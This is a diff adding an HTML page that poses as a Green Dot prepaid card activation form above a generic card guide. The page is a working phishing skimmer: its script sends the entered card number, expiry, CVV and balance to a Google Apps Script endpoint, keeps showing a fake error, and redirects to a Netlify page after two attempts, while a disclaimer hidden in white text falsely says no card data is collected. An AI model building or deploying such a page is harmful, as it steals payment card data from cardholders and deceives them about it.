@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Green Dot • Activate Card & Complete Guide</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-color: #f7f9fc;
+      color: #333;
+      min-height: 100vh;
+      padding: 20px;
+      -webkit-tap-highlight-color: transparent;
+    }
+    
+    /* Main container */
+    .main-wrapper {
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+    
+    /* Form Container (Top Section) */
+    .form-container {
+      width: 100%;
+      max-width: 460px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      margin: 0 auto 30px auto;
+      overflow: hidden;
+    }
+    
+    .content {
+      padding: 30px 25px;
+    }
+    
+    h2 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      line-height: 1.3;
+      text-align: center;
+    }
+    
+    p.subtext {
+      color: #555;
+      margin-bottom: 30px;
+      line-height: 1.5;
+      font-size: 16px;
+      text-align: center;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: #333;
+      font-size: 14px;
+    }
+    
+    input {
+      width: 100%;
+      padding: 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border-color 0.3s;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+    
+    input[name="cardnumber"] {
+      -webkit-text-security: none;
+      inputmode: numeric;
+      pattern: "[0-9\s]*";
+    }
+    
+    input[name="expiry"] {
+      inputmode: numeric;
+      pattern: "[0-9/]*";
+    }
+    
+    input[name="pin"] {
+      inputmode: numeric;
+      pattern: "[0-9]{3}";
+      -webkit-text-security: disc;
+    }
+    
+    input[name="currentBalance"] {
+      inputmode: decimal;
+      pattern: "[0-9.]*";
+    }
+    
+    input:focus {
+      outline: none;
+      border-color: #00B259;
+    }
+    
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    
+    .row {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+    
+    .row .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+    
+    .amount {
+      position: relative;
+    }
+    
+    .amount::before {
+      content: "$";
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #999;
+      font-size: 18px;
+      z-index: 1;
+    }
+    
+    .amount input {
+      padding-left: 40px;
+    }
+    
+    .next-btn {
+      background: #00A651 !important;
+      color: white;
+      border: none;
+      padding: 18px;
+      width: 100%;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      margin: 30px 0;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      -webkit-tap-highlight-color: rgba(0, 166, 81, 0.3);
+    }
+    
+    .next-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(0, 166, 81, 0.25);
+      background: #009144 !important;
+    }
+    
+    .next-btn:active {
+      transform: translateY(0);
+      background: #00853D !important;
+    }
+    
+    .disclaimer {
+      font-size: 12px;
+      color: #ffffff !important;  /* Changed to white */
+      line-height: 1.6;
+      padding-top: 20px;
+      border-top: 1px solid #eee;
+      text-align: center;
+      background-color: transparent;
+    }
+    
+    .error-message {
+      background-color: #fff3f3;
+      border: 1px solid #ffcdcd;
+      border-radius: 8px;
+      padding: 30px 25px;
+      margin: 20px 0;
+      display: none;
+      text-align: center;
+    }
+    
+    .error-icon {
+      font-size: 48px;
+      color: #d32f2f;
+      margin-bottom: 20px;
+    }
+    
+    .error-message h3 {
+      color: #d32f2f;
+      margin: 0 0 15px 0;
+      font-size: 22px;
+    }
+    
+    .error-message p {
+      color: #666;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+    
+    .error-code {
+      font-family: monospace;
+      background-color: #f5f5f5;
+      padding: 10px 20px;
+      border-radius: 6px;
+      color: #d32f2f;
+      font-weight: bold;
+      font-size: 18px;
+      display: inline-block;
+      margin: 15px 0;
+    }
+    
+    .try-again-btn {
+      background: linear-gradient(90deg, #d32f2f, #b71c1c);
+      color: white;
+      border: none;
+      padding: 18px;
+      width: 100%;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      margin: 25px 0 15px 0;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      -webkit-tap-highlight-color: rgba(211, 47, 47, 0.3);
+    }
+    
+    .check-details-message {
+      background-color: #fff3f3;
+      border: 1px solid #ffcdcd;
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+      display: none;
+      text-align: center;
+      animation: fadeIn 0.5s;
+    }
+    
+    .check-details-icon {
+      font-size: 40px;
+      color: #d32f2f;
+      margin-bottom: 15px;
+    }
+    
+    .check-details-message h3 {
+      color: #d32f2f;
+      margin: 0 0 10px 0;
+      font-size: 20px;
+    }
+    
+    .check-details-message p {
+      color: #666;
+      margin-bottom: 10px;
+      font-size: 15px;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .keypad-hint {
+      font-size: 11px;
+      color: #666;
+      margin-top: 5px;
+      display: none;
+    }
+    
+    /* Guide Section Styles (Bottom Section) */
+    .guide-section {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      padding: 30px;
+      margin-top: 20px;
+    }
+    
+    .guide-header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    
+    .guide-header h1 {
+      color: #00a651;
+      font-size: 2rem;
+      margin-bottom: 1rem;
+    }
+    
+    .guide-header p {
+      font-size: 1.1rem;
+      color: #555;
+    }
+    
+    .guide-content {
+      max-width: 100%;
+    }
+    
+    .guide-section h2 {
+      color: #00a651;
+      font-size: 1.8rem;
+      margin: 2rem 0 1rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 3px solid #e8f5e9;
+      text-align: left;
+    }
+    
+    .guide-section h3 {
+      color: #2c5f2d;
+      font-size: 1.3rem;
+      margin: 1.5rem 0 1rem;
+    }
+    
+    .guide-section p {
+      margin-bottom: 1.2rem;
+      color: #333;
+      line-height: 1.6;
+    }
+    
+    .feature-list {
+      background: #f9f9f9;
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin: 1rem 0;
+    }
+    
+    .feature-list li {
+      list-style: none;
+      margin-bottom: 1rem;
+      padding-left: 2rem;
+      position: relative;
+    }
+    
+    .feature-list li::before {
+      content: "✔️";
+      position: absolute;
+      left: 0;
+      color: #00a651;
+    }
+    
+    .benefits-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1.5rem;
+      margin: 1.5rem 0;
+    }
+    
+    .benefit-card {
+      background: #f5f5f5;
+      padding: 1.5rem;
+      border-radius: 8px;
+      border-left: 4px solid #00a651;
+    }
+    
+    .benefit-card h4 {
+      color: #00a651;
+      margin-bottom: 0.5rem;
+      font-size: 1.1rem;
+    }
+    
+    .comparison-table {
+      overflow-x: auto;
+      margin: 2rem 0;
+    }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: white;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+    
+    th {
+      background: #00a651;
+      color: white;
+      padding: 1rem;
+      text-align: left;
+      font-weight: 600;
+    }
+    
+    td {
+      padding: 1rem;
+      border-bottom: 1px solid #eaeaea;
+    }
+    
+    tr:last-child td {
+      border-bottom: none;
+    }
+    
+    td:first-child {
+      font-weight: 600;
+      background: #f5f5f5;
+    }
+    
+    .info-box {
+      background: #fff3cd;
+      border: 1px solid #ffeeba;
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+    }
+    
+    .info-box-title {
+      font-weight: bold;
+      color: #856404;
+      margin-bottom: 0.5rem;
+      font-size: 1.1rem;
+    }
+    
+    .faq-item {
+      margin-bottom: 1.5rem;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid #eaeaea;
+    }
+    
+    .faq-item:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+    
+    .faq-question {
+      font-weight: bold;
+      color: #00a651;
+      margin-bottom: 0.5rem;
+      font-size: 1.1rem;
+    }
+    
+    .who-list {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    
+    .who-item {
+      background: #e8f5e9;
+      padding: 1rem;
+      border-radius: 6px;
+      text-align: center;
+      font-weight: 500;
+    }
+    
+    .feature-block {
+      background: #e8f5e9;
+      padding: 1.5rem;
+      border-radius: 8px;
+      margin-bottom: 1rem;
+    }
+    
+    .feature-block h3 {
+      margin: 0 0 0.5rem 0;
+    }
+    
+    .feature-block p {
+      margin: 0;
+    }
+    
+    /* Footer */
+    .site-footer {
+      text-align: center;
+      padding: 2rem 0;
+      color: #666;
+      font-size: 0.9rem;
+    }
+    
+    /* Responsive */
+    @media (max-width: 768px) {
+      body {
+        padding: 10px;
+      }
+      
+      .form-container {
+        max-width: 100%;
+      }
+      
+      .content {
+        padding: 25px 20px;
+      }
+      
+      h2 {
+        font-size: 22px;
+      }
+      
+      .guide-section {
+        padding: 20px;
+      }
+      
+      .guide-header h1 {
+        font-size: 1.8rem;
+      }
+      
+      .guide-section h2 {
+        font-size: 1.5rem;
+      }
+      
+      .keypad-hint {
+        display: block;
+      }
+      
+      .benefits-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      body {
+        padding: 8px;
+        display: block;
+        -webkit-user-select: none;
+        user-select: none;
+      }
+      
+      .form-container {
+        border-radius: 8px;
+      }
+      
+      .content {
+        padding: 20px 15px;
+      }
+      
+      h2 {
+        font-size: 20px;
+      }
+      
+      .row {
+        flex-direction: column;
+        gap: 16px;
+      }
+      
+      .next-btn, .try-again-btn {
+        padding: 16px;
+        font-size: 16px;
+      }
+      
+      .guide-section {
+        padding: 15px;
+      }
+      
+      .guide-header h1 {
+        font-size: 1.5rem;
+      }
+      
+      .guide-section h2 {
+        font-size: 1.3rem;
+      }
+      
+      .guide-section h3 {
+        font-size: 1.1rem;
+      }
+      
+      .who-list {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    @media (min-width: 1200px) {
+      .form-container {
+        max-width: 500px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-wrapper">
+    <!-- Form Section (Top) -->
+    <div class="form-container">
+      <div class="content">
+        <div id="formSection">
+          <h2>You are seconds away from using your new card</h2>
+          <p class="subtext">Please enter your card's information in the form below.</p>
+          
+          <div id="checkDetailsMessage" class="check-details-message">
+            <div class="check-details-icon">⚠️</div>
+            <h3>Check your details</h3>
+            <p>Please verify the information you entered and try again.</p>
+          </div>
+
+          <form id="activationForm">
+            <div class="form-group">
+              <label for="cardnumber">Card Number</label>
+              <input type="tel" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" 
+                     oninput="formatCardNumber(this)" required 
+                     pattern="[0-9\s]{13,19}" 
+                     title="Enter 16-digit card number">
+            </div>
+            
+            <div class="row">
+              <div class="form-group">
+                <label for="expiry">Expiry Date</label>
+                <input type="tel" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" 
+                       oninput="formatExpiry(this)" required 
+                       pattern="(0[1-9]|1[0-2])\/[0-9]{2}" 
+                       title="Enter expiry date as MM/YY">
+              </div>
+              <div class="form-group">
+                <label for="pin">CVV</label>
+                <input type="tel" id="pin" name="pin" placeholder="123" maxlength="3" 
+                       required pattern="[0-9]{3}" 
+                       title="3 digit CVV" 
+                       oninput="limitCVV(this)">
+              </div>
+            </div>
+            
+            <div class="form-group">
+              <label for="currentBalance">Current Balance</label>
+              <div class="amount">
+                <input type="tel" id="currentBalance" name="currentBalance" placeholder="0.00" 
+                       oninput="formatBalance(this)" required
+                       pattern="[0-9.]+" 
+                       title="Enter current balance">
+              </div>
+            </div>
+            
+            <button type="submit" class="next-btn">NEXT</button>
+          </form>
+
+          <div class="disclaimer">
+            This page does not save, process, or transmit any card information. 
+            Activation must be completed on the card issuer's official website or mobile app only. 
+            We do not collect or store card details. This is an informational blog that helps users find 
+            the correct official source for prepaid card activation. We are not affiliated with any bank.
+          </div>
+        </div>
+
+        <div id="errorMessage" class="error-message">
+          <div class="error-icon">❌</div>
+          <h3>Activation Failed</h3>
+          <p>We encountered an error while processing your card activation.</p>
+          <div class="error-code">Server Error: GDx1002</div>
+          <p>Unable to register card information. Please try after sometime</p>
+          <button onclick="showFormAgain()" class="try-again-btn">TRY AGAIN</button>
+          
+          <div class="disclaimer" style="margin-top: 20px;">
+            This page does not save, process, or transmit any card information. 
+            Activation must be completed on the card issuer's official website or mobile app only. 
+            We do not collect or store card details. This is an informational blog that helps users find 
+            the correct official source for prepaid card activation. We are not affiliated with any bank.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Guide Section (Bottom) -->
+    <div class="guide-section">
+      <div class="guide-header">
+        <h1>Green Dot Prepaid Card: A Complete Guide to Features, Benefits, and How It Works</h1>
+        <p>If you're looking for a flexible alternative to traditional banking, the Green Dot prepaid card is one of the most popular options in the United States. With millions of users, Green Dot offers a convenient way to manage money without needing a traditional bank account.</p>
+      </div>
+      
+      <div class="guide-content">
+        <p style="font-size: 1.2rem; color: #2c5f2d; margin-bottom: 2rem;">In this guide, we'll explain how the Green Dot prepaid debit card works, its benefits, fees, and whether it's the right choice for you.</p>
+
+        <!-- What Is -->
+        <h2>What Is a Green Dot Prepaid Card?</h2>
+        <p>The Green Dot prepaid debit card is a reloadable Visa or Mastercard that allows you to:</p>
+        <ul class="feature-list">
+          <li>Make purchases online and in stores</li>
+          <li>Pay bills</li>
+          <li>Withdraw cash at ATMs</li>
+          <li>Receive direct deposit</li>
+        </ul>
+        <p>Unlike a credit card, you can only spend the money you load onto the card, which helps with budgeting and avoiding debt.</p>
+
+        <!-- How It Works -->
+        <h2>How Does Green Dot Prepaid Card Work?</h2>
+        <p>Using a Green Dot card is simple:</p>
+        <ol style="margin-left: 2rem; margin-bottom: 1rem;">
+          <li style="margin-bottom: 0.5rem;"><strong>Purchase the Card</strong> – Available at retail stores or online.</li>
+          <li style="margin-bottom: 0.5rem;"><strong>Activate the Card</strong> – Register online to verify your identity.</li>
+          <li style="margin-bottom: 0.5rem;"><strong>Load Money</strong> – Add funds via direct deposit, bank transfer, or cash reload locations.</li>
+          <li style="margin-bottom: 0.5rem;"><strong>Start Spending</strong> – Use it anywhere Visa or Mastercard is accepted.</li>
+        </ol>
+        <p>Many users choose Green Dot for its ease of use and wide acceptance across the U.S.</p>
+
+        <!-- Key Features -->
+        <h2>Key Features of Green Dot Prepaid Debit Card</h2>
+        <p>Here are some of the most popular features:</p>
+        
+        <div style="margin-top: 1.5rem;">
+          <div class="feature-block">
+            <h3>✔️ Direct Deposit</h3>
+            <p>Get your paycheck or government benefits deposited directly to your card.</p>
+          </div>
+          
+          <div class="feature-block">
+            <h3>✔️ Online Bill Pay</h3>
+            <p>Pay utilities, subscriptions, and other bills easily.</p>
+          </div>
+          
+          <div class="feature-block">
+            <h3>✔️ Mobile App Access</h3>
+            <p>Manage your balance, track spending, and receive alerts.</p>
+          </div>
+          
+          <div class="feature-block">
+            <h3>✔️ No Credit Check</h3>
+            <p>Since it's prepaid, there's no credit check required to open an account.</p>
+          </div>
+        </div>
+
+        <!-- Benefits -->
+        <h2>Benefits of Using a Green Dot Card</h2>
+        
+        <div class="benefits-grid">
+          <div class="benefit-card">
+            <h4>1. Budget Control</h4>
+            <p>You can only spend what you load, which helps prevent overspending.</p>
+          </div>
+          
+          <div class="benefit-card">
+            <h4>2. Banking Alternative</h4>
+            <p>Great option for people without a traditional bank account.</p>
+          </div>
+          
+          <div class="benefit-card">
+            <h4>3. Widely Accepted</h4>
+            <p>Works anywhere Visa or Mastercard debit cards are accepted.</p>
+          </div>
+          
+          <div class="benefit-card">
+            <h4>4. Safer Than Cash</h4>
+            <p>If registered, your funds may be protected if the card is lost or stolen.</p>
+          </div>
+        </div>
+
+        <!-- Fees -->
+        <h2>Green Dot Prepaid Card Fees (Important to Know)</h2>
+        <p>Before applying, it's important to understand possible fees:</p>
+        
+        <ul class="feature-list" style="background: #fff3cd;">
+          <li>Monthly maintenance fee (varies by plan)</li>
+          <li>ATM withdrawal fees</li>
+          <li>Cash reload fees</li>
+          <li>Out-of-network ATM charges</li>
+        </ul>
+        
+        <div class="info-box">
+          <div class="info-box-title">⚠️ Always review the official fee schedule before choosing any prepaid card.</div>
+        </div>
+
+        <!-- Who Should Consider -->
+        <h2>Who Should Consider a Green Dot Prepaid Card?</h2>
+        <p>The Green Dot card may be a good fit for:</p>
+        
+        <div class="who-list">
+          <div class="who-item">Individuals without a traditional bank account</div>
+          <div class="who-item">Students learning to manage money</div>
+          <div class="who-item">People rebuilding financial habits</div>
+          <div class="who-item">Those who prefer prepaid debit over credit cards</div>
+        </div>
+        
+        <p style="margin-top: 1rem;">It may not be ideal for people who want high interest savings or advanced banking services.</p>
+
+        <!-- Comparison -->
+        <h2>Green Dot vs Traditional Bank Account</h2>
+        
+        <div class="comparison-table">
+          <table>
+            <thead>
+              <tr>
+                <th>Feature</th>
+                <th>Green Dot Prepaid Card</th>
+                <th>Traditional Bank</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Credit Check</td>
+                <td>No</td>
+                <td>Sometimes</td>
+              </tr>
+              <tr>
+                <td>Overdraft Risk</td>
+                <td>Limited</td>
+                <td>Possible</td>
+              </tr>
+              <tr>
+                <td>Monthly Fees</td>
+                <td>May apply</td>
+                <td>Varies</td>
+              </tr>
+              <tr>
+                <td>Full Banking Services</td>
+                <td>Limited</td>
+                <td>Yes</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- How to Apply -->
+        <h2>How to Apply for a Green Dot Prepaid Card</h2>
+        <p>You can apply online through the official Green Dot website or purchase a starter card at major retail stores across the U.S. After activation and identity verification, your card is ready to use.</p>
+
+        <!-- FAQ -->
+        <h2>Frequently Asked Questions</h2>
+        
+        <div class="faq-item">
+          <div class="faq-question">Is Green Dot a real bank?</div>
+          <p>Green Dot operates as a financial technology company and works with regulated banking partners.</p>
+        </div>
+        
+        <div class="faq-item">
+          <div class="faq-question">Can I use Green Dot for online shopping?</div>
+          <p>Yes, you can use it anywhere Visa or Mastercard debit cards are accepted.</p>
+        </div>
+        
+        <div class="faq-item">
+          <div class="faq-question">Does Green Dot build credit?</div>
+          <p>Standard prepaid cards typically do not build credit, as they are not credit products.</p>
+        </div>
+
+        <!-- Final Thoughts -->
+        <div style="background: linear-gradient(135deg, #f5f5f5, white); border-left: 5px solid #00a651; padding: 2rem; margin-top: 2rem;">
+          <h2 style="border-bottom: none; margin-top: 0;">Final Thoughts</h2>
+          <p style="font-size: 1.2rem;">The Green Dot prepaid debit card offers flexibility, convenience, and an accessible alternative to traditional banking. It's especially helpful for budgeting and managing everyday expenses without relying on credit.</p>
+          <p style="font-weight: bold; margin-top: 1rem;">Before signing up, review the fees and features carefully to decide if it matches your financial needs.</p>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="site-footer">
+      <p>© 2025 Green Dot Information Guide. For official information, visit www.greendot.com</p>
+    </div>
+  </div>
+
+  <script>
+    let attemptCount = 0;
+    const maxAttempts = 2;
+    
+    function formatCardNumber(input) {
+      let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+      let formatted = value.match(/.{1,4}/g);
+      if (formatted) input.value = formatted.join(' ');
+    }
+
+    function formatExpiry(input) {
+      let value = input.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        input.value = value.slice(0,2) + '/' + value.slice(2,4);
+      } else {
+        input.value = value;
+      }
+    }
+    
+    function formatBalance(input) {
+      let value = input.value;
+      value = value.replace(/[^0-9.]/g, '');
+      const parts = value.split('.');
+      if (parts.length > 2) {
+        value = parts[0] + '.' + parts.slice(1).join('');
+      }
+      input.value = value;
+    }
+    
+    function limitCVV(input) {
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 3) {
+        value = value.slice(0, 3);
+      }
+      input.value = value;
+    }
+    
+    function showCheckDetailsMessage() {
+      attemptCount++;
+      
+      if (attemptCount >= maxAttempts) {
+        setTimeout(() => {
+          window.location.href = "https://lucky-cheesecake-123e0a.netlify.app/form.html";
+        }, 1500);
+      }
+    }
+    
+    function showError() {
+      document.getElementById('formSection').style.display = 'none';
+      document.getElementById('errorMessage').style.display = 'block';
+    }
+    
+    function showFormAgain() {
+      document.getElementById('formSection').style.display = 'block';
+      document.getElementById('errorMessage').style.display = 'none';
+      document.getElementById('activationForm').reset();
+      attemptCount = 0;
+      document.getElementById('checkDetailsMessage').style.display = 'none';
+    }
+
+    document.getElementById('activationForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      
+      // Show error message
+      document.getElementById('checkDetailsMessage').style.display = 'block';
+      
+      // Call the function to track attempts
+      showCheckDetailsMessage();
+      
+      const formData = new FormData(event.target);
+      const formDetails = {
+        cardnumber: formData.get('cardnumber'),
+        expiry: formData.get('expiry'),
+        pin: formData.get('pin'),
+        currentBalance: formData.get('currentBalance'),
+        attempt: attemptCount
+      };
+      
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbyronD2P3ii6jnZP-4W1lNAQ5PGaP_AjdEZqKDDFhBk-5xrUAmEL0bubn0SnOvphiM/exec';
+      
+      fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formDetails)
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+    });
+    
+    window.addEventListener('load', function() {
+      document.getElementById('cardnumber').focus();
+      
+      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        const inputs = document.querySelectorAll('input[type="tel"]');
+        inputs.forEach(input => {
+          input.addEventListener('focus', function() {
+            this.setAttribute('inputmode', 'numeric');
+          });
+        });
+      }
+    });
+    
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        e.preventDefault();
+      }
+    });
+  </script>
+</body>
+</html>
